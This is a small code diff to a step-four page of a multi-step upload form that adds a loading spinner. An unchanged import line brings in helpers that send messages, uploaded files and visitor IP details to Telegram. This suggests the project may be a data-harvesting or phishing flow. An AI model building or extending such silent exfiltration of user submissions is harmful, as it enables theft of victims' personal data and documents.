@@ -4,6 +4,7 @@ import { useAuth } from "@/lib/auth";
 import { Upload, Loader2, Globe, ChevronDown } from "lucide-react";
 import { useI18n, type Language } from "@/lib/i18n";
 import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
+import { LoadingModal } from "@/components/loading-modal";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -306,6 +307,7 @@ export default function Step4() {
 
   return (
     <div style={{ minHeight: "100vh", background: "#f5f5f5", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
+      <LoadingModal show={loading} />
       <style>{`
         .s4i:focus { border-color: #333 !important; box-shadow: 0 0 0 3px rgba(0,0,0,0.06); }
         .s4i::placeholder { color: #bbb; }
